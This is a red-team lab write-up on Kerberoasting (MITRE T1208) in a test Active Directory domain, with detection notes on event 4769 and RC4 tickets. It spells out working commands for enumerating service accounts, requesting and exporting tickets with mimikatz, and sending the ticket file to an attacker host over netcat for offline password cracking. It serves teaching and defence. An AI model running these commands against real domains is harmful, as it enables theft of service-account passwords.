---
description: Credential Access
---

# T1208: Kerberoasting

This lab explores an attack that allows any domain user to request kerberos tickets from TGS that are encrypted with NTLM hash of the plaintext password of a domain user account that is used as a service account \(for example for running an IIS service\) and crack them offline avoiding lockouts.

## Execution

Note the vulnerable domain member - a user account with `servicePrincipalName` attribute set \(important piece for kerberoasting - only user accounts with that property set are most likely susceptible to kerberoasting\):

![](../.gitbook/assets/kerberoast-principalname.png)

Attacker setting up an nc listener to receive a hash for cracking:

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```csharp
nc -lvp 443 > kerberoast.bin
```
{% endcode-tabs-item %}
{% endcode-tabs %}

### Extracting the Ticket

Attacker enumerating user accounts with `serverPrincipalName` set:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/kerberoast-enumeration.png)

Additionally, user accounts with SPN set could be extracted with a native windows binary:

```text
 setspn -T offense -Q */*
```

![](../.gitbook/assets/kerberoast-setspn%20%281%29.png)

Attacker requesting a kerberos ticker for a user account with `servicePrincipalName` set to `HTTP/dc-mantvydas.offense.local`- it gets stored in the memory:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc-mantvydas.offense.local"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/kerberoast-kerberos-token.png)

Using mimikatz, the attacker extracts kerberos ticket from the memory and exports it to a file for cracking:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
mimikatz # kerberos::list /export
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/kerberoast-exported-kerberos-tickets.png)

Attacker sends the exported service ticket to attacking machine for offline cracking:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
nc 10.0.0.5 443 < C:\tools\mimikatz\x64\2-40a10000-spotless@HTTP~dc-mantvydas.offense.local-OFFENSE.LOCAL.kirbi
```
{% endcode-tabs-item %}
{% endcode-tabs %}

### Cracking the Ticket

Attacker brute forces the password of the service ticket:

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```csharp
python2 tgsrepcrack.py pwd kerberoast.bin
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/kerberoast-cracked.png)

## Observations

Below is a security log `4769` showing service access being requested:

![](../.gitbook/assets/kerberoast-4769.png)

If you see `Add-event -AssemblyName SystemIdentityModel` \(from advanced Powershell logging\) followed by a windows security event `4769` immediately after that, you may be looking at an old school Kerberoasting:, especially if ticket encryption type has a value `0x17` \(23 decimal, meaning it's `RC4` encrypted\):

![](../.gitbook/assets/kerberoast-logs.png)

### Traffic

Below is the screenshot showing a request being sent to the `Ticket Granting Service` \(TGS\) for the service with a servicePrincipalName `HTTP/dc-mantvydas.offense.local` :

![](../.gitbook/assets/kerberoast-tgs-req.png)

Below is the response from the TGS for the user `spotless` \(we initiated this attack from offense\spotless\) which contains the encrypted \(RC4\) kerberos ticket \(server part\) to access the `HTTP/dc-mantvydas.offense.local` service. It is the same ticket we cracked earlier with [tgsrepcrack.py](t1208-kerberoasting.md#cracking-the-ticket):

![](../.gitbook/assets/kerberoast-tgs-res.png)

Out of curiosity, let's decrypt the kerberos ticket since we have the password the ticket was encrypted with.

Creating a kerberos keytab file for use in wireshark:

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```bash
root@~# ktutil 
ktutil:  add_entry -password -p HTTP/iis_svc@dc-mantvydas.offense.local -k 1 -e arcfour-hmac-md5
Password for HTTP/iis_svc@dc-mantvydas.offense.local: 
ktutil:  wkt /root/tools/iis.keytab
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/kerberoast-creating-keytab.png)

Adding the keytab to wireshark:

![](../.gitbook/assets/kerberoast-wireshark-keytab.png)

Note how the ticket's previously encrypted piece is now in plain text and we can see information pertinent to the requested ticket for a service `HTTP/dc-mantvydas.offense.local` :

![](../.gitbook/assets/kerberoast-decrypted.png)

### tgsrepcrack.py

Looking inside the code and adding a couple of print statements in key areas of the script, we can see that the password from the dictionary \(`Passw0rd`\) initially gets converted into an NTLM \(`K0`\) hash, then another key `K1` is derived from the initial hash and a message type, yet another key `K2` is derived from K1 and an MD5 digest of the encrypted data. Key `K2` is the actual key used to decrypt the encrypted ticket data:

![](../.gitbook/assets/kerberoast-crackstation.png)

![](../.gitbook/assets/kerberoast-printstatements.png)

I did not have to, but I also used an online RC4 decryptor tool to confirm the above findings:

![](../.gitbook/assets/kerberoast-decryptedonline.png)

{% file src="../.gitbook/assets/kerberoast.pcap" caption="kerberoast.pcap" %}

[Tim Medin - Attacking Kerberos: Kicking the Guard Dog of Hades](https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin%281%29.pdf)

{% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1208\",\"type\":\"link\",\"title\":\"Kerberoasting - ATT&CK for Enterprise\"}" %}

{% embed data="{\"url\":\"https://github.com/nidem/kerberoast\",\"type\":\"link\",\"title\":\"nidem/kerberoast\",\"description\":\"Contribute to kerberoast development by creating an account on Github.\",\"icon\":{\"type\":\"icon\",\"url\":\"https://github.com/fluidicon.png\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://avatars3.githubusercontent.com/u/4877511?s=400&v=4\",\"width\":365,\"height\":365,\"aspectRatio\":1}}" %}

{% embed data="{\"url\":\"https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/\",\"type\":\"link\",\"title\":\"Extracting Service Account Passwords with Kerberoasting \| Insider Threat\",\"description\":\"Kerberoasting is effective for extracting service account credentials from Active Directory without needing elevated rights or causing domain traffic.\",\"icon\":{\"type\":\"icon\",\"url\":\"https://blog.stealthbits.com/wp-content/uploads/2016/06/cropped-Logo\_STEALTHbits\_Orb\_Blue\_250x250-192x192.png\",\"width\":192,\"height\":192,\"aspectRatio\":1},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://blog.stealthbits.com/wp-content/uploads/2017/05/Blog2-banner-Extract-Service-Account-Passwords-Kerberoasting1024x326.jpg\",\"width\":1024,\"height\":326,\"aspectRatio\":0.318359375}}" %}

{% embed data="{\"url\":\"http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/\",\"type\":\"link\",\"title\":\"Kerberoasting Without Mimikatz\",\"description\":\"Just about two years ago, Tim Medin presented a new attack technique he christened “Kerberoasting”. While we didn’t realize the full implications of this at the time of release, t…\",\"icon\":{\"type\":\"icon\",\"url\":\"http://www.harmj0y.net/blog/wp-content/uploads/2017/05/cropped-specter-192x192.png\",\"width\":192,\"height\":192,\"aspectRatio\":1},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"http://www.harmj0y.net/blog/wp-content/uploads/2016/10/invoke\_kerberoast\_empire-1024x520.png\",\"width\":640,\"height\":325,\"aspectRatio\":0.5078125}}" %}

{% embed data="{\"url\":\"https://pentestlab.blog/2018/06/12/kerberoast/\",\"type\":\"link\",\"title\":\"Kerberoast\",\"description\":\"The process of cracking Kerberos service tickets and rewriting them in order to gain access to the targeted service is called Kerberoast. This is very common attack in red team engagements since it…\",\"icon\":{\"type\":\"icon\",\"url\":\"https://s1.wp.com/i/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://pentestlab.files.wordpress.com/2018/06/autokerberoast-service-ticket-hashes-of-particular-domain-and-group.png\",\"width\":724,\"height\":385,\"aspectRatio\":0.5317679558011049}}" %}

{% embed data="{\"url\":\"https://blog.xpnsec.com/kerberos-attacks-part-1/\",\"type\":\"link\",\"title\":\"Kerberos AD Attacks - Kerberoasting\",\"description\":\"Recently I\'ve been trying to make sure that my redteam knowledge is up to date, exploring many of the advancements in Active Directory Kerberos attacks... and there have been quite a few! I finally found some free time this week to roll up my sleeves and dig into the internals\",\"icon\":{\"type\":\"icon\",\"url\":\"https://blog.xpnsec.com/assets/favicon/android-icon-192x192.png?v=94d6be4395\",\"width\":192,\"height\":192,\"aspectRatio\":1},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://blog.xpnsec.com/content/images/2017/09/cerberos-1.jpg\",\"width\":615,\"height\":539,\"aspectRatio\":0.8764227642276423}}" %}

{% embed data="{\"url\":\"https://pentestlab.blog/2018/06/12/kerberoast/\",\"type\":\"link\",\"title\":\"Kerberoast\",\"description\":\"The process of cracking Kerberos service tickets and rewriting them in order to gain access to the targeted service is called Kerberoast. This is very common attack in red team engagements since it…\",\"icon\":{\"type\":\"icon\",\"url\":\"https://s1.wp.com/i/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://pentestlab.files.wordpress.com/2018/06/autokerberoast-service-ticket-hashes-of-particular-domain-and-group.png\",\"width\":724,\"height\":385,\"aspectRatio\":0.5317679558011049}}" %}

{% embed data="{\"url\":\"http://rc4.online-domain-tools.com/\",\"type\":\"link\",\"title\":\"RC4 Encryption – Easily encrypt or decrypt strings or files\",\"description\":\"Online interface for RC4 encryption algorithm, also known as ARCFOUR, an algorithm that is used within popular cryptographic protocols such as SSL or WEP.\",\"icon\":{\"type\":\"icon\",\"url\":\"http://online-domain-tools.com/images/apple-touch-icon.png\",\"aspectRatio\":0}}" %}

{% embed data="{\"url\":\"https://crackstation.net/\",\"type\":\"link\",\"title\":\"CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.\",\"description\":\"Crackstation is the most effective hash cracking service. We crack: MD5, SHA1, SHA2, WPA, and much more...\",\"icon\":{\"type\":\"icon\",\"url\":\"https://crackstation.net/favicon.ico\",\"aspectRatio\":0}}" %}

